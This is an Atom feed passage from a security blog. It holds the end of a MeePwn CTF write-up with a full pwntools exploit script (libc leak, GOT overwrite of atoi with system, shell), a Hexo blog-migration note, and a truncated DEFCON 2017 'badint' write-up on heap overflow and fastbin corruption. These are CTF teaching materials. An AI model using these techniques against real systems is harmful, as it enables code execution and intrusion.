class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"139.59.244.42"</span></span><br><span class="line">PORT = <span class="number">31340</span></span><br><span class="line">ELF_PATH = <span class="string">"./oldschool_noalarm"</span></span><br><span class="line">LIBC_PATH = <span class="string">"./libc6_2.23-0ubuntu7_amd64.so"</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">'INFO'</span> <span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_book</span><span class="params">(book, author, dlen, desc)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    r.sendafter(<span class="string">"name:"</span>, book)</span><br><span class="line">    r.sendafter(<span class="string">"uthor:"</span>, author)</span><br><span class="line">    r.sendlineafter(<span class="string">"tion:"</span>, str(dlen))</span><br><span class="line">    r.sendafter(<span class="string">"tion:"</span>, desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book</span><span class="params">(idx, book, author, desc)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"?"</span>, str(idx))</span><br><span class="line">    r.sendafter(<span class="string">"name:"</span>, book)</span><br><span class="line">    r.sendafter(<span class="string">"uthor:"</span>, author)</span><br><span class="line">    r.sendafter(<span class="string">"tion:"</span>, desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_book</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Choice:"</span>, <span class="string">"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_book</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"Choice:"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">   </span><br><span class="line">    book, author = <span class="string">"1"</span>*<span class="number">8</span>+<span class="string">"\n"</span>, <span class="string">"a"</span>*<span class="number">8</span>+<span class="string">"\n"</span>  </span><br><span class="line">    add_book(book, author, <span class="number">100</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line">    show_book()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    r.recvuntil(<span class="string">"AAAA"</span>)</span><br><span class="line">    libc.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - libc.symbols[<span class="string">'atoi'</span>] - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">"libc_base: "</span>+hex(libc.address))</span><br><span class="line"></span><br><span class="line">    del_book(<span class="number">1</span>)</span><br><span class="line">    book, author = <span class="string">"1"</span>*<span class="number">32</span>, <span class="string">"a"</span>*<span class="number">32</span>  </span><br><span class="line">    <span class="comment"># make book[0]-&gt;size = very big</span></span><br><span class="line">    <span class="comment"># later when we edit book[0]-&gt;desc, it will overwrite the pointer of book[0]</span></span><br><span class="line">    add_book(book, author, <span class="number">100</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="comment"># edit book[1]-&gt;desc, overwrite book[0]</span></span><br><span class="line">    <span class="comment"># change book[0]-&gt;name to got section</span></span><br><span class="line">    <span class="comment"># later we can edit book[0] &amp; do GOT hijacking</span></span><br><span class="line">    payload = <span class="string">"i"</span>*<span class="number">503</span> + <span class="string">"\x00"</span> + p32(<span class="number">1</span>) + p64(<span class="number">0x602028</span>) + <span class="string">"\n"</span></span><br><span class="line">    edit_book(<span class="number">1</span>, <span class="string">"1\n"</span>, <span class="string">"1\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite atoi to system</span></span><br><span class="line">    payload = <span class="string">"i"</span>*<span class="number">4</span> + p64(libc.symbols[<span class="string">'system'</span>]) + <span class="string">"\n"</span></span><br><span class="line">    book, author, desc = p64(<span class="number">0x400706</span>)[:<span class="number">6</span>:] , p64(<span class="number">0x4006f6</span>)[:<span class="number">6</span>:], payload</span><br><span class="line">    r.sendlineafter(<span class="string">"Choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"?"</span>, <span class="string">"1"</span>)</span><br><span class="line">    r.sendafter(<span class="string">"name:"</span>, book)</span><br><span class="line">    <span class="comment"># don't know why author won't read input.....</span></span><br><span class="line">    <span class="comment">#r.sendafter("uthor:", author)</span></span><br><span class="line">    r.sendafter(<span class="string">"tion:"</span>, desc)</span><br><span class="line"> </span><br><span class="line">    r.sendline(<span class="string">"sh"</span>)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><p>flag: <code>MeePwnCTF{0ld_sch00ld_C4n4ry_1s_0n_th3_st4ck}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwnable&lt;/p&gt;
&lt;p&gt;64 bit ELF, Partial RELRO, NX enabled, No PIE, has canary.  &lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="BOF" scheme="https://bruce30262.github.io/tags/BOF/"/>
    
      <category term="MeePwn" scheme="https://bruce30262.github.io/tags/MeePwn/"/>
    
  </entry>
  
  <entry>
    <title>Migrate to Github Pages</title>
    <link href="https://bruce30262.github.io/2017/05/29/Migrate-to-Github-Pages/"/>
    <id>https://bruce30262.github.io/2017/05/29/Migrate-to-Github-Pages/</id>
    <published>2017-05-29T15:31:00.000Z</published>
    <updated>2018-01-03T15:08:05.611Z</updated>
    
    <content type="html"><![CDATA[<p>So I finally decided to migrate my blog from <a href="http://logdown.com/" target="_blank" rel="noopener">Logdown</a> to <a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a>. Took me about three days to get it done. Here I write down some notes to record the whole migration process.  </p><a id="more"></a>  <h1 id="Installing-Hexo"><a href="#Installing-Hexo" class="headerlink" title="Installing Hexo"></a>Installing Hexo</h1><p>I chose <a href="https://hexo.io/zh-tw/" target="_blank" rel="noopener">Hexo</a> for my blog framework.</p><h2 id="Environment-Setting"><a href="#Environment-Setting" class="headerlink" title="Environment Setting"></a>Environment Setting</h2><p>First I prepared a <a href="https://github.com/bruce30262/docker-misc/blob/master/hexo-blog/Dockerfile" target="_blank" rel="noopener">docker image</a> for my blogging environment. Then I created two repositories on github:  </p><ul><li><a href="https://github.com/bruce30262/bruce30262.github.io" target="_blank" rel="noopener">bruce30262.github.io</a><ul><li>The actual content of the blog. Hexo will update this repo after the deployment.</li></ul></li><li><a href="https://github.com/bruce30262/bruce30262_blog" target="_blank" rel="noopener">bruce30262_blog</a><ul><li>Content of the hexo framework ( markdown files, theme, config file…etc )</li><li>The docker container will mount this directory to the working directory, something like:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -p 4000:4000 -v [HOME_DIR]/bruce30262_blog:/app --name hexo-blog bruce30262/docker-misc:hexo-blog</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>Later inside the container we can just run the hexo command under the <code>/app</code> directory and start blogging.</p><h2 id="Hexo-command"><a href="#Hexo-command" class="headerlink" title="Hexo command"></a>Hexo command</h2><ul><li><code>hexo init</code> : Initialize a hexo blog</li><li><code>hexo g(enerate)</code> : Generate the static site</li><li><code>hexo s(erver)</code> : Launch the blog at the local side ( for previewing )</li><li><p><code>hexo d(eploy)</code> : </p><ul><li>Deploy the blog to github pages.</li><li>To fully deploy the blog, use the <code>hexo g -d</code> or the <code>hexo d -g</code> command.</li><li><p>Before deploying the blog, we need to do some setting in <code>_config.yml</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/bruce30262/bruce30262.github.io.git</span><br></pre></td></tr></table></figure></li><li><p>Don’t forget to install the <strong>hexo-deployer-git</strong> plugin</p></li></ul></li></ul><h2 id="Hexo-plugin"><a href="#Hexo-plugin" class="headerlink" title="Hexo plugin"></a>Hexo plugin</h2><p>To install the hexo plugin:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install [plugin_name] --save</span><br></pre></td></tr></table></figure><ul><li><code>hexo-deployer-git</code> : For deploying the blog to github</li><li><code>hexo-admin</code> : An admin interface for blogging</li><li><code>hexo-generator-sitemap</code> : For generating sitemap</li><li><code>hexo-generator-feed</code> : For generating atom.xml ( rss feed )</li></ul><h1 id="Hexo-theme"><a href="#Hexo-theme" class="headerlink" title="Hexo theme"></a>Hexo theme</h1><p>I chose the <a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">NexT.Pisces</a> theme. Here’s the <a href="https://github.com/iissnan/hexo-theme-next/blob/master/README.en.md" target="_blank" rel="noopener">English</a> and the <a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">Chinese</a> version of the theme’s documentations.</p><p>To choose the Pisces scheme, modified the <strong>theme’s <code>_config.yml</code></strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">#scheme: Muse</span><br><span class="line">#scheme: Mist</span><br><span class="line">scheme: Pisces    &lt;-- remove the comment</span><br></pre></td></tr></table></figure></p><h2 id="Social-link"><a href="#Social-link" class="headerlink" title="Social link"></a>Social link</h2><p>In the <strong>site’s <code>_config.yml</code></strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Social </span><br><span class="line">social:</span><br><span class="line">  Github: your github link</span><br><span class="line">  Twitter: your twitter linmk</span><br><span class="line">  Facebook: your facebook link</span><br></pre></td></tr></table></figure></p><p>In the <strong>theme’s <code>_config.yml</code></strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">social_icons:</span><br><span class="line">  enable: true</span><br><span class="line">  # Icon Mappings.</span><br><span class="line">  # KeyMapsToSocialItemKey: NameOfTheIconFromFontAwesome</span><br><span class="line">  Github: github</span><br><span class="line">  Twitter: twitter</span><br><span class="line">  Facebook: facebook</span><br></pre></td></tr></table></figure></p><h2 id="View-count-amp-Visitor-count"><a href="#View-count-amp-Visitor-count" class="headerlink" title="View count &amp; Visitor count"></a>View count &amp; Visitor count</h2><p>Enable the <a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener"><strong>busuanzi</strong> ( 不蒜子 )</a> feature.<br>In the <strong>theme’s <code>_config.yml</code></strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Show PV/UV of the website/page with busuanzi.</span><br><span class="line"># Get more information on http://ibruce.info/2015/04/04/busuanzi/</span><br><span class="line">busuanzi_count:</span><br><span class="line">  # count values only if the other configs are false</span><br><span class="line">  enable: true</span><br><span class="line">  # custom uv span for the whole site</span><br><span class="line">  site_uv: true</span><br><span class="line">  site_uv_header: &lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt;</span><br><span class="line">  site_uv_footer: Total visitors</span><br><span class="line">  # custom pv span for the whole site</span><br><span class="line">  site_pv: true</span><br><span class="line">  site_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt;</span><br><span class="line">  site_pv_footer: Total views</span><br><span class="line">  # custom pv span for one page only</span><br><span class="line">  page_pv: true</span><br><span class="line">  page_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt;</span><br><span class="line">  page_pv_footer: views</span><br></pre></td></tr></table></figure></p><h2 id="Share-widget-AddThis"><a href="#Share-widget-AddThis" class="headerlink" title="Share widget ( AddThis )"></a>Share widget ( AddThis )</h2><p>First login to the <a href="http://www.addthis.com/" target="_blank" rel="noopener">AddThis</a> website, and create a share widget. Then, in the <strong>theme’s <code>_config.yml</code></strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Share</span><br><span class="line">#jiathis:</span><br><span class="line"># Warning: JiaThis does not support https.</span><br><span class="line">add_this_id: ra-XXXXXXXXXXXXX     &lt;-- the pubid</span><br></pre></td></tr></table></figure></p><h2 id="Migrate-Disqus-comment"><a href="#Migrate-Disqus-comment" class="headerlink" title="Migrate Disqus comment"></a>Migrate Disqus comment</h2><p>First enable the disqus feature.</p><p>In the <strong>site’s <code>_config.yml</code></strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disqus_shortname: old_disqus_shortname   &lt;-- old site&apos;s disqus shortname</span><br></pre></td></tr></table></figure></p><p>In the <strong>theme’s <code>_config.yml</code></strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Disqus</span><br><span class="line">disqus:</span><br><span class="line">  enable: true</span><br><span class="line">  shortname: old_disqus_shortname   &lt;-- old site&apos;s disqus shortname</span><br><span class="line">  count: true    &lt;-- display the comment count</span><br></pre></td></tr></table></figure></p><p>Then, follow the step from the <a href="https://help.disqus.com/customer/portal/articles/912757-url-mapper" target="_blank" rel="noopener">disqus website</a>, use the URL Mapper to migrate the disqus threads.</p><p>Also change the setting in the disqus account ( new website url, <a href="https://help.disqus.com/customer/portal/articles/1261429-how-to-use-trusted-domains" target="_blank" rel="noopener">add trust domains</a>…etc ). It will take a while for disqus to reset the whole thing.</p><h1 id="Migrate-the-blog"><a href="#Migrate-the-blog" class="headerlink" title="Migrate the blog"></a>Migrate the blog</h1><ol><li>Export all the markdown files from Logdown.</li><li>Write some script to convert the posts’ header ( author, tags, categories…etc ).</li><li>Move those files to the <a href="https://github.com/bruce30262/bruce30262_blog" target="_blank" rel="noopener">bruce30262_blog</a> repository.</li><li>Commit, push &amp; deploy.</li></ol><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li>Github Pages + Hexo Tutorial<ul><li><a href="https://linghucong.js.org/2016/04/15/2016-04-15-hexo-github-pages-blog/" target="_blank" rel="noopener">link1</a> (Chinese)</li><li><a href="https://xuanwo.org/2015/03/26/hexo-intor/" target="_blank" rel="noopener">link2</a> (Chinese)</li></ul></li><li><a href="http://phriscage.github.io/2016/01/18/Hexo-blog-development-on-Docker/" target="_blank" rel="noopener">Hexo blog development on Docker</a></li><li><a href="https://github.com/hexojs/hexo/issues/2505" target="_blank" rel="noopener">Execute npm install hexo-cli -g promt ERR (root user)</a></li><li><a href="http://fionat.github.io/2016/04/02/sitemap/" target="_blank" rel="noopener">Hexo sitemap</a> (Chinese)</li><li><a href="http://hanhailong.com/2015/10/08/Hexo%E2%80%94%E6%AD%A3%E7%A1%AE%E6%B7%BB%E5%8A%A0RSS%E8%AE%A2%E9%98%85/" target="_blank" rel="noopener">Hexo rss feed</a> (Chinese)</li><li><a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">Hexo NexT theme github page</a></li><li><a href="https://github.com/iissnan/hexo-theme-next/pull/660" target="_blank" rel="noopener">Add AddThis to Hexo-NexT-theme</a> (Chinese)</li><li><a href="https://help.disqus.com/customer/portal/articles/286778-migration-tools" target="_blank" rel="noopener">Disqus Migration Tools</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;So I finally decided to migrate my blog from &lt;a href=&quot;http://logdown.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Logdown&lt;/a&gt; to &lt;a href=&quot;https://pages.github.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Github Pages&lt;/a&gt;. Took me about three days to get it done. Here I write down some notes to record the whole migration process.  &lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="https://bruce30262.github.io/categories/note/"/>
    
    
      <category term="Hexo" scheme="https://bruce30262.github.io/tags/Hexo/"/>
    
      <category term="node.js" scheme="https://bruce30262.github.io/tags/node-js/"/>
    
      <category term="git" scheme="https://bruce30262.github.io/tags/git/"/>
    
      <category term="docker" scheme="https://bruce30262.github.io/tags/docker/"/>
    
      <category term="NexT" scheme="https://bruce30262.github.io/tags/NexT/"/>
    
  </entry>
  
  <entry>
    <title>DEFCON CTF 2017 Quals -- badint</title>
    <link href="https://bruce30262.github.io/2017/05/02/2017-05-02-1784522/"/>
    <id>https://bruce30262.github.io/2017/05/02/2017-05-02-1784522/</id>
    <published>2017-05-02T06:59:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> Potent Pwnables</p><p>64 bit ELF, Partial RELRO, NX enabled, No canary &amp; PIE. <strong>libc not provided</strong>. </p><a id="more"></a>  <p>This C++ program will read some input from user, then store the data into the heap memory:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./badint </span><br><span class="line">SEQ #: 0</span><br><span class="line">Offset: 0</span><br><span class="line">Data: AAAAAAA</span><br><span class="line">LSF Yes/No: Yes</span><br><span class="line">RX PDU [0] [len=4]</span><br><span class="line">Assembled [seq: 0]: aaaaaa0a</span><br><span class="line"></span><br><span class="line">SEQ #:</span><br></pre></td></tr></table></figure></p><p>Notice that if we input data <code>AAAA</code>, the program will convert <code>AAAA</code> to <code>0xaaaa</code>.  </p><p>According to my teammate, the following input will crash the program:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SEQ #: 1</span><br><span class="line">Offset: 0</span><br><span class="line">Data: 0000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">LSF Yes/No: Yes</span><br><span class="line">RX PDU [1] [len=31]</span><br><span class="line">Assembled [seq: 1]: 00000000000000000000000000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">SEQ #: 1</span><br><span class="line">Offset: 0</span><br><span class="line">Data: 111111111111111111111111111111111111111</span><br><span class="line">LSF Yes/No: Yes</span><br><span class="line">RX PDU [1] [len=20]</span><br><span class="line">Assembled [seq: 1]: 1111111111111111111111111111111111111101</span><br><span class="line"></span><br><span class="line">SEQ #: 1</span><br><span class="line">Offset: 18</span><br><span class="line">Data: 22222222222222222222222</span><br><span class="line">LSF Yes/No: Yes</span><br><span class="line">RX PDU [1] [len=12]</span><br><span class="line">Assembled [seq: 1]: 000000000000000022222202</span><br><span class="line"></span><br><span class="line">*** Error in `./badint&apos;: free(): invalid next size (fast): 0x000000000224a0c0 ***</span><br></pre></td></tr></table></figure></p><p>After done some analyzing, we found the vulnerability:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">len = (<span class="keyword">unsigned</span> __int8)get_len(cur_obj);</span><br><span class="line">data = (<span class="keyword">const</span> <span class="keyword">void</span> *)get_data(cur_obj);</span><br><span class="line">offset = get_offset(cur_obj);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(offset + new_buf), data, len); <span class="comment">// &lt;-- Here !!</span></span><br></pre></td></tr></table></figure></p><p>The program use <code>memcpy(new_buf + offset, data, len)</code> to copy the input data into a heap buffer. The variable <code>offet</code> can be controlled by us, and thus lead to a <strong>heap overflow vulnerability</strong>. The program crashed due to the <code>size</code> metadata was overwritten into an invalid size, causing the <code>free()</code> function aborted the program.  </p><p>Now we spot the vulnerability, time to exploit the service. First we’ll have to leak some address. Here I leaked the libc’s address by doing the following:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./badint </span><br><span class="line">SEQ #: 1</span><br><span class="line">Offset: 8</span><br><span class="line">Data: 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br><span class="line">LSF Yes/No: Yes</span><br><span class="line">RX PDU [1] [len=144]</span><br><span class="line">Assembled [seq: 1]: 788ba4952b7f000011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br><span class="line"></span><br><span class="line">SEQ #:</span><br></pre></td></tr></table></figure></p><p>Here we set the offset to 8, so the data we input will copy to <code>heap_buf+8</code>. <code>heap_buf</code> is a chunk in unsortbin which will be allocated for storing our input data, and thus its <code>fd</code> &amp; <code>bk</code> will contain the address of <code>main_arena+88</code>. We copy the data to <code>heap_buf+8</code>, means that <code>fd</code> will not be overwritten, and so we could leak the libc’s address by printing out the assembled data.  </p><p>The next step is to try hijack the program control flow. Here I decided to use the fastbin corruption attack. First we’ll have to arrange the following heap memory layout:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ hip</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0xc26cc0 --&gt; 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0xc26c80 --&gt; 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0xc26c20 --&gt; 0x0   </span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">                  top: 0xc26f10 (size : 0x1c0f0) </span><br><span class="line">       last_remainder: 0xc26e00 (size : 0x50) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></p><p>By using the amazing <a href="https://github.com/scwuaptx/Pwngdb/tree/master/angelheap" target="_blank" rel="noopener">angelheap</a> from <a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="noopener">Pwngdb</a>, we could see that there’s a chunk in <code>fastbin[4]</code>(size = 0x60), and a chunk in <code>fastbin[2]</code>(size = 0x40).  </p><p>Then, we allocate the chunk in <code>fastbin[4]</code>, and copy our data into the chunk. Since there’s a heap overflow vulnerability, we can actually overwrite the data in chunk @ <code>fastbin[2]</code> – by setting the <code>offet</code> variable to <code>0x60</code> ( <code>0xc26c20</code> + <code>0x60</code> = <code>0xc26c80</code> ). We overwrite the <code>fd</code> pointer in chunk @ <code>fastbin[2]</code>, making it point to the GOT area. This is because in an x64 non-PIE binary, its GOT entries will contain some address which start with <code>0x40</code> (if the function hasn’t been resolved yet):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ tel 0x604018</span><br><span class="line">00:0000|  0x604018 --&gt; 0x7fbdea10c800 (&lt;__printf&gt;:      sub    rsp,0xd8)</span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">01:0008|  0x604020 --&gt; 0x400ab6 (&lt;__gmon_start__@plt+6&gt;:        push   0x1)</span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">02:0016|  0x604028 --&gt; 0x7fbdea126690 (&lt;_IO_puts&gt;:      push   r12)</span><br><span class="line">03:0024|  0x604030 --&gt; 0x7fbdea723f10 (&lt;operator new[](unsigned long)&gt;: sub    rsp,0x8)</span><br><span class="line">04:0032|  0x604038 --&gt; 0x7fbdea721f10 (&lt;operator delete(void*)&gt;:        jmp    0x7fbdea71ddb0 &lt;free@plt&gt;)</span><br><span class="line">05:0040|  0x604040 --&gt; 0x7fbdea126e70 (&lt;__GI__IO_setvbuf&gt;:      push   rbp)</span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">06:0048|  0x604048 --&gt; 0x400b06 (&lt;fopen@plt+6&gt;: push   0x6)</span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">07:0056|  0x604050 --&gt; 0x7fbdea0d7740 (&lt;__libc_start_main&gt;:     push   r14)</span><br></pre></td></tr></table></figure></p><p>If we off-set the memory layout in the GOT area, we could found that it actually has some good <code>fastbin[2]</code>(again, size = 0x40) chunks:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x604042 &lt;setvbuf@got.plt+2&gt;:   0x0b0600007fbdea12      0x7740000000000040  &lt;-- here</span><br><span class="line">0x604052 &lt;__libc_start_main@got.plt+2&gt;: 0x4ad000007fbdea0d      0x1b7000007fbdea12</span><br><span class="line">0x604062 &lt;strlen@got.plt+2&gt;:    0xdea000007fbdea14      0xc3c000007fbdea0e</span><br><span class="line">0x604072 &lt;signal@got.plt+2&gt;:    0x0b6600007fbdea0e      0x2650000000000040 &lt;-- here</span><br><span class="line">0x604082 &lt;alarm@got.plt+2&gt;:     0x0b8600007fbdea18      0x0b96000000000040 &lt;-- here</span><br><span class="line">0x604092 